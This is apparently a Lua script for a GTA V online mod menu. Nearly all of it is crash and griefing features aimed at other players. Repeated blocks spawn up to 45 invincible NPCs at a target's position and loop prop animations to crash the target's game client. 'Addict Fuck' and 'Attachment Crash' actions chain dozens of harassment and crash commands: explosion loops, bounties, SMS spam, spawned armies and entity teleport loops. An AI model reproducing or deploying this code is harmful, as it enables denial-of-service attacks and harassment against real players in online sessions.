menu.slider(TaskCrashes, "Number Of Guitars & Bongos", {"noguitarsnbongos"}, "Sends Guitar & Bongos crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Guitar & Bongos Crash", {"bongoguitarscrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("IG_Musician_00")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_MUSICIAN", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_acc_guitar_01") then
--                        entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)


       local peds = 5
menu.slider(TaskCrashes, "Number Of Cigars", {"nocigars"}, "Sends Cigar crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Cigar Crash", {"cigarscrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("A_F_Y_BevHills_02")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_SMOKING", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("ng_proc_cigarette01a") then
--                        entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)

local peds = 5
menu.slider(TaskCrashes, "Number Of Spatulas", {"nospatulars"}, "Sends Spatula crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Spatula Crash", {"spatularcrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("ig_siemonyetarian")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "PROP_HUMAN_BBQ", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_fish_slice_01") then
--                        entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)

local peds = 5
menu.slider(TaskCrashes, "Number Of Barbell", {"nobarbell"}, "Sends Barbell crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Barbell Crash", {"barbellcrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("A_F_M_BodyBuild_01")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_MUSCLE_FREE_WEIGHTS", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_barbell_02") then
--                        entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)

local peds = 5
menu.slider(TaskCrashes, "Number Of Hammers", {"nohammers"}, "Sends Hammers crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Hammers Crash", {"hammercrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("s_m_y_construct_02")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_HAMMERING", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_tool_hammer") then
--                        entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)

local peds = 5
menu.slider(TaskCrashes, "Number Of Fishing Rods", {"norods"}, "Sends Fishing crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Fishing Crash", {"fishingcrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("s_m_m_cntrybar_01")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_STAND_FISHING", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_fishing_rod_02") then
--                        entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)

local peds = 5
menu.slider(TaskCrashes, "Number Of Jack Hammmers", {"nojacks"}, "Sends Jack Hammmer crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Jack Hammmer Crash", {"jackhammercrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("s_m_y_construct_01")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_CONST_DRILL", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_tool_jackham") then
 --                       entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
 --               entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)

local peds = 5
menu.slider(TaskCrashes, "Number Of Brooms", {"nobrooms"}, "Sends Broom crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Broom Crash", {"broomcrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("csb_janitor")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_JANITOR", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_tool_broom") then
 --                       entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
 --               entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)


local peds = 5
menu.slider(TaskCrashes, "Number Of Russian Drunks", {"nodrunks"}, "Sends Russian Drunk crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Russian Drunk Crash", {"drunkcrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("ig_russiandrunk")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_DRINKING", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_amb_40oz_02") then
 --                       entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
 --               entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)


local peds = 5
menu.slider(TaskCrashes, "Number Of Trowels", {"notrowels"}, "Sends Trowel crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Trowel Crash", {"trowelcrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("s_m_m_gardener_01")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_GARDENER_PLANT", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_cs_trowel") then
 --                       entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
 --               entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)


local peds = 5
menu.slider(TaskCrashes, "Number Of Window Cleans", {"nowincleans"}, "Sends Window Clean crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Window Clean Crash", {"wincleancrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("s_m_y_winclean_01")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_MAID_CLEAN", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_rag_01") then
 --                       entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
 --               entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)

local peds = 5
menu.slider(TaskCrashes, "Number Of Torches", {"notorches"}, "Sends Torch crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Torch Crash", {"torchcrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("s_m_y_chef_01")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_WELDING", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_weld_torch") then
 --                       entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
 --               entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)

local peds = 5
menu.slider(TaskCrashes, "Number Of Coffee Cups", {"nocoffeecups"}, "Sends Coffee crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Coffee Crash", {"coffeecrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("s_m_y_chef_01")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_DRINKING", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("p_amb_coffeecup_01") then
 --                       entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
 --               entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)

local addictcrash = menu.list(lobbycrash, "Addict Crashes", {"addictcrashes"}, "")

menu.toggle_loop(addictcrash, "Addict Crashing", {"addictcrashing"}, "", function(on_toggle)
    Addictcrashes(pid)
end)

menu.action(addictcrash, "Addict Fuck", {"fuckplayer"}, "Trolls player in a ton of ways. May cause crashes. Won't work on yourself. Restart script to stop all trolls.", function()
    if pid ~= players.user() then
    menu.trigger_commands("anticrashcamera")
    util.yield(100)
    local player_ped = PLAYER.PLAYER_PED_ID()    
    local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
    local pld = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(pld)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -75.2188, -818.582, 2699.9976)
    menu.trigger_commands("freeze" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(100)
    menu.trigger_commands("confuse" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(100)
    menu.trigger_commands("error" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(100)
    menu.trigger_commands("ragdoll" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(100)
    menu.trigger_commands("shakecam" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(100)
    menu.trigger_commands("aggressivenpcs" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(100)
    menu.trigger_commands("mugloop" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(100)
    menu.trigger_commands("beast" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(100)
    menu.trigger_commands("particlespam" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(100)
    menu.trigger_commands("bounty " .. PLAYER.GET_PLAYER_NAME(pid) .. " 10000")
    util.yield(100)
    menu.trigger_commands("pwanted" .. PLAYER.GET_PLAYER_NAME(pid) .. " 5")
    util.yield(100)
    menu.trigger_commands("attachcandycane" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(100)
    menu.trigger_commands("disarm" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(100)
    menu.trigger_commands("ceokick" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(100)
    menu.trigger_commands("dropfakebags" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(100)
    menu.trigger_commands("glitchphysics" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1500)
    menu.trigger_commands("deerarmy" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1500)
    menu.trigger_commands("rabbitarmy" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1500)
    menu.trigger_commands("yulearmy" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1500)
    menu.trigger_commands("furryarmy" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1500)
    menu.trigger_commands("pussyarmy" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1500)
    menu.trigger_commands("fathoesarmy" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1500)
    menu.trigger_commands("toplessarmy" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1500)
    menu.trigger_commands("allsounds" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1500)
    menu.trigger_commands("basketcage" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1500)
    menu.trigger_commands("invincbandito" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1500)
    menu.trigger_commands("sendbandito" .. PLAYER.GET_PLAYER_NAME(pid) .. " 25")
    util.yield(1500)
    menu.trigger_commands("invinckart" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(100)
    menu.trigger_commands("sendgokart" .. PLAYER.GET_PLAYER_NAME(pid) .. " 15")
    util.yield(1500)
    menu.trigger_commands("invincbuzzard" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(100)
    menu.trigger_commands("sendbuzzard" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1500)
    menu.trigger_commands("sendtank" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1500)
    menu.trigger_commands("deliver" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1500)
    menu.trigger_commands("specialdeliver" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1500)
    menu.trigger_commands("smsspam" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1500)
    menu.trigger_commands("atomizeron" .. PLAYER.GET_PLAYER_NAME(pid))
    util.yield(1500)
    menu.trigger_commands("explode" .. players.get_name(pid))
    util.yield(1500)
    menu.trigger_commands("explodeloop" .. players.get_name(pid))
    util.yield(1500)
    menu.trigger_commands("explosiondelay".. players.get_name(pid) .. " 0")
    util.yield(1500)
    menu.trigger_commands("explosionshake".. players.get_name(pid) .. " 10")
    util.yield(1500)
    menu.trigger_commands("stopall".. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("anticrashcamera")
    util.yield(100)
    util.toast("Addict Fuck Sent to " .. players.get_name(pid))
    util.log("Addict Fuck Sent to " .. players.get_name(pid))
    end
end, nil, nil, COMMANDPERM_AGGRESSIVE)

local attachcrash = menu.list(lobbycrash, "Attachment Crashes", {}, "")

menu.action(attachcrash, "Attachment Crash", {"attachcrash"}, "It will turn on anticam for you, Warning! This is OP...", function()
    menu.trigger_commands("anticrashcamera")
    util.yield(100)
    local player_ped = PLAYER.PLAYER_PED_ID()    
    local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
    local pld = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(pld)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1210.615, 3850.737, 490.0916)
    util.yield(100)
    menu.trigger_commands("attachallnearby" .. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("tpallentitiesloop" .. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("craftloop1" .. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("craftloop2" .. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("craftloop3" .. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("craftloop4" .. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("craftloop5" .. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("badnet" .. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("togglefragv3" .. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("toggleweedcrash" .. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("vehcrash" .. players.get_name(pid))
    util.yield(100)
    util.toast("Wait For TP Loop to finish or restart the script...")
    menu.trigger_commands("anticrashcamera")
    util.yield(100)
    menu.trigger_commands("attachallnearby" .. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("tpallentitiesloop" .. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("craftloop1" .. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("craftloop2" .. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("craftloop3" .. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("craftloop4" .. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("craftloop5" .. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("badnet" .. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("togglefragv3" .. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("toggleweedcrash" .. players.get_name(pid))
    util.yield(100)
    local player_ped = PLAYER.PLAYER_PED_ID()    
    local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
    local pld = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(pld)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -74.96841, -817.8495, 326.17517)
    util.yield(100)
end)

